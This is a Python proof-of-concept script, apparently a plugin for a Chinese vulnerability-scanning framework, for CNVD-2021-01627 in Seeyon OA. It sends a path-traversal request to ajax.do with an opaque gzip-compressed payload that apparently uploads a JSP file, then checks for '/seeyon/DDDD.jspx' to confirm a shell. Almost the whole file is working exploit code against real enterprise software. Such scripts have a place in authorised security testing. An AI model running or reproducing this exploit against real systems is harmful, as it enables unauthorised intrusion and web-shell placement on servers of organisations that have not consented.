from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin   

POC_NAME = "Seeyon_Ajax_Getshell"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class Seeyon_Ajax_Getshell(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0037',    # PoC的VID编号
            'vbid': '',
            'Name': 'Seeyon_Ajax_Getshell',    # PoC名称
            'Author': 'Dryn',    # PoC作者
            'Create_date': '2021-08-06',    # PoC创建时间
            },

        'vul': {
            'Product': '致远oa',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': 'File upload',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                CNVD-2021-01627
                致远OA ajax.do登录绕过 任意文件上传
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-01-12',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        url = urljoin(target,'/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip')
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        data = "managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%03uTY%C2%93%C2%A2H%10%7E%C3%9E%C3%BD%15%C2%84%2F%C3%9A%C3%9136%C2%82%C2%8C%C3%ADN%C3%ACC%7B%21%C2%A2%C2%A8%C2%A0%5C%1B%C3%BB%00U%C3%88a%15%C2%B0rH%C3%991%C3%BF%7D%0B%C2%B0%C2%A7%7Bb%7B%C3%AB%C2%A52%C2%B32%C2%BF%C3%8A%C3%BB%C2%AF%C3%97%C3%AE%29%C2%B9%C3%A0%029%07%C2%92z%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%B8%C2%96ts%2F%C3%8B%C2%BB%C3%AF%C3%A2y%C2%95%5E%C2%BC%2C%0B%C2%93%C2%B8%7E%C3%94%C3%B2K%18%C3%BBL%C3%AA%C3%A4%01%C3%B3%27%C3%93%C3%A9%C3%B7%C2%9F%C2%AE%C2%9E%C3%AB%C2%A4i%C3%B6%C2%94y%1EI%C3%A2%C2%A7%C3%8E%C3%B7%C3%9F%C2%99%C3%B6%C3%BC%169%C2%A5%C3%93%0F%C2%93%C3%BE%C2%8E%C2%9A%C3%A4%C3%86%25%C3%8C%C2%BD%0B%C2%93%C2%BE%C3%93%1C%05%C2%88%C2%BD%2B%C3%B3%C2%89Z%C2%AF%C3%86%7F%C3%AC%C3%8C%C3%A8%C3%A9GYZu%1E%7E%C2%A22w%0F%C2%B2%C3%80C%C2%A8va%27%C2%A670K%C2%89%C3%8B%C2%8DYi%19%C3%A4%C2%AE%28%C3%9C%C2%B6%C2%B8%C2%96%C2%B1%C2%A1%C2%B3TY0K%C3%8A5%C2%97%06%10%C3%8F%0B%C3%80%C3%AB%C3%85%1A%2B%C2%A5%C2%AB%C2%8D%C3%A5%C3%A3%C3%A0%C2%A5%3C%C2%8A%C2%8B%C3%98%C3%96%24%1Fb%C2%9D%00%0E%C2%95n%C3%84%C2%86%1BmH%C2%A4h%C3%B8%C3%AC%C3%84%C3%8Au%C2%8B%C3%95%14%60%3D%C2%82%22%C3%A2lM%C2%B8Z%06D%C2%92%C2%88r+%C2%8E%09%C2%AC%C3%B1%C3%B1%C2%82%C2%B34a%40%C3%9F%C2%B3u%C2%98d%0Do%C3%BA%C2%85%C3%85%C2%AF%04%C2%B0T%C3%8BOe%14%C3%9766%C2%85%1CJ%C3%A5.%C2%AA%C3%BE%01%C3%BC%C3%8B7%5B%C3%94%23W%5C%10%C3%8BTS%C2%97%1B%3EJ%C2%A2%C2%92Y%C2%A6r%C2%93%16G%C3%9F6%03%C3%966%C2%843+%C2%93%19%C3%95%C2%B9%01%C2%B6%2A-CE+%C3%8Euy%C3%9E%C3%AA%1D%C3%84q%401%C2%88%24nR%C2%8FW%06%C2%80%C3%922%C2%A5%C2%B7%C3%BC%C3%A0%0A%C2%8DU%C3%A6%18%1B%7F%C3%8FU%01%C3%A07%C2%BEM%C2%82%C3%903U%24-rh%C2%85hD%C3%A3c%C2%A1%C2%B9%2A%C2%A4ek%C2%B7%C3%86%2A%C2%B21%2A%C3%ACc%C2%8B-%C2%8BR%C2%B6%C2%99V%C3%A1%1AW%C3%88%C3%85%C2%90u%C2%A6%C3%A7%C3%91%C3%89d%C2%9FiN%C3%AB%C2%BC%C2%9Fm%C2%A3%C3%96%5B%054%074%7F%C3%B7%C2%BC%C3%85J%040%C2%BAB%C2%B1Bp%26%1C%C3%A0r%C2%95%C2%BA%18%C3%B8%C3%8E%C2%8D%0D%C3%AD%C3%83%7E%60%1F6dk%C3%98%C3%88%C2%8A%C3%B4%C3%B3%C3%B6+%0D%C2%ACP%1A%01N%C2%BF55%08%C2%85%2B4U%C3%832%C2%AA%C2%81%C2%AD%C3%B9%21%C3%94%C2%A4%C3%8C%21%C3%A7%C3%91%C2%9ECW%C2%A7%C2%8Dq%C3%BCF%C2%AF1Dp%C2%8Eh%5D%C3%95%C3%80%C3%85%0A%C2%92%C2%A7%C2%AB%C2%89%C2%AAoB%C3%B9%C2%90Gk%1A%C2%83c%C3%AE%C2%93MX%15%C2%B6%09%C3%BC%23%C2%A7Gu%C2%AC%1A%C2%A7%0BG%7E%C2%82%2C%C3%A2%27%1F%C3%BE%C2%8C%C3%AD_%C3%BFLe%22%C2%85%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%00%C3%B1%C3%93%C3%B5%1B%C2%BEv%1E%C2%B9X%C3%A7i%7D%12%28%06%29+%C2%8D%5E%5B%C2%9FZ%C2%AF%C3%B1%C3%AB%C3%97%C3%9A%C3%88%C3%933%C2%95%C2%83%C3%84%22%C3%82%C3%99em%C2%9A%C2%8FE%26%C2%8B%02%C2%82dr%C2%83%C3%86%C2%B0p%0Dt%C2%A3o%C3%93%C2%BD%C2%AE%2C%C2%94H%C2%9D%C3%93%C2%BC%C2%96w%C2%BB%C2%A2%C3%A9%0FNE%C3%BBX%C3%876%C3%ADUy%C2%B9B%C3%80%C3%94%11%C3%A0%C3%B7%C2%85%C3%8D%C3%A9%C3%AC%11%C3%ABo%7F%14%C2%A0%C2%A6%C3%A9%C3%90%C2%BA%C3%B8%C2%98P%3FS%1A%03%C2%8D%1F%C2%AE%C3%9CXa-C%C2%88h%7C%C3%94%0F%C2%BD%C2%82%C3%86%22%03%24hzz%C3%8F%C2%8D%0B%28%C3%AACHk%C2%BB%C2%9B%C2%8E%C2%9B%C2%9E%04%C2%9CB%1Cs%C3%82%C2%BA%C2%A2%C3%8E%C3%AE%C2%A2k%C3%99%C3%96uU%C2%BA%C3%BC%C3%BE%C3%B1%7D%C3%88%C2%99%C2%AC%C2%88%C3%BB8%C3%8C%40%7F%C3%B2%C2%A2%C3%8D%C2%BF%0Dg%1EH+%C2%9Dsx%C2%BF%C3%9B%11%C3%BF%5C%C2%A9%C3%B7%C3%9F%C2%A9n%C3%8D%C3%AELk%C3%9B2%C2%BD%3B%60%C2%BF%C2%BD%27%C3%85%C3%A9D%01%C2%9A%25%C3%B0%C3%B0%C2%A5s%3C%2C%C2%BE%3E%7F%5C%12%1F%C3%97L%C2%BFaP%C3%9C%C3%BB%08%C3%BE%7F%C2%BA%00%25%C2%99G%1D%C3%BB%C3%B1%C2%BD%5E%C2%83%C2%94%C2%80%C3%9E%C2%89%C3%89r%27%0F%01SUU%C3%AF%C3%A1%C2%B5%C3%BB%C2%83%C3%AEF%C2%BA%1F_%C3%AB%3B%C2%BF%14%5E%C3%B7%C3%AF%7F%01%C2%83%C2%9EG6V%05%00%00"

        location = ""
        # 使用req做HTTP请求的发送和响应的处理，req是TCC框架将requests的HTTP请求方法封装成统一的req函数，使用req(url, method, **kwargs)，参数传递同requests
        resp = req(url, 'post', headers=headers,data=data, allow_redirects=False)

        url1 = urljoin(target,'/seeyon/DDDD.jspx')
        resp1 = req(url1, 'get', headers=headers,timeout=10,verify=False, allow_redirects=False)

        if resp1.status_code == 200:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = location
            if verbose:
                highlight('Seeyon_Ajax_Getshell Found!')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息

        else:
            if verbose:
                highlight('Seeyon_Ajax_Getshell not Found!')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)

